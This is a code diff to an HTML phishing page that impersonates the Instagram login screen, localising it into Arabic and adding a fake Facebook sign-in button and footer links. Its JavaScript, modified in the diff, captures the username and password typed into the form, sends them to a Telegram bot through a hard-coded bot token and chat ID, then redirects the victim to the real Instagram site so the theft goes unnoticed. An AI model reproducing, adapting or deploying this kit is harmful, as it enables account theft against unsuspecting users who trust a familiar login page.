@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    <title>تسجيل الدخول - Instagram</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            direction: rtl; /* اتجاه النصوص من اليمين لليسار */
         }
         .login-container {
             background-color: #fff;
@@ -35,6 +36,7 @@
             border: 1px solid #dbdbdb;
             border-radius: 5px;
             font-size: 16px;
+            text-align: right; /* محاذاة النصوص لليمين */
         }
         button {
             width: 100%;
@@ -50,35 +52,67 @@
         button:hover {
             background-color: #318ce7;
         }
+        .facebook-login {
+            background-color: #4267B2;
+            color: #fff;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .login-options {
+            margin: 15px 0;
+        }
+        .login-options a {
+            color: #3897f0;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .footer a {
+            color: #3897f0;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="login-container">
     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+    <button class="facebook-login">متابعة بحساب فيسبوك</button>
+    <div class="login-options">أو</div>
     <form id="loginForm" method="POST">
         <input type="hidden" name="chat_id" value="1900509620">
         <input type="hidden" name="text" id="message">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit" onclick="sendTelegram(event)">Log In</button>
+        <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit" onclick="sendTelegram(event)">تسجيل الدخول</button>
     </form>
+    <div class="login-options">
+        <a href="#">هل نسيت كلمة السر؟</a>
+    </div>
+</div>
+
+<div class="footer">
+    أليس لديك حساب؟ <a href="#">تسجيل</a>
 </div>
 
 <script>
     function sendTelegram(event) {
-        event.preventDefault();  // 
+        event.preventDefault();  // منع إرسال النموذج افتراضيًا
 
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
-        var message = "Amir⌫\n" +"Email: " + username + "\nPassword: " + password;
+        var message = "Email: " + username + "\nPassword: " + password;
 
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));
 
-        // إ
+        // إعادة التوجيه إلى موقع إنستجرام بعد الإرسال
         xhr.onload = function() {
             window.location.href = "https://www.instagram.com";
         };
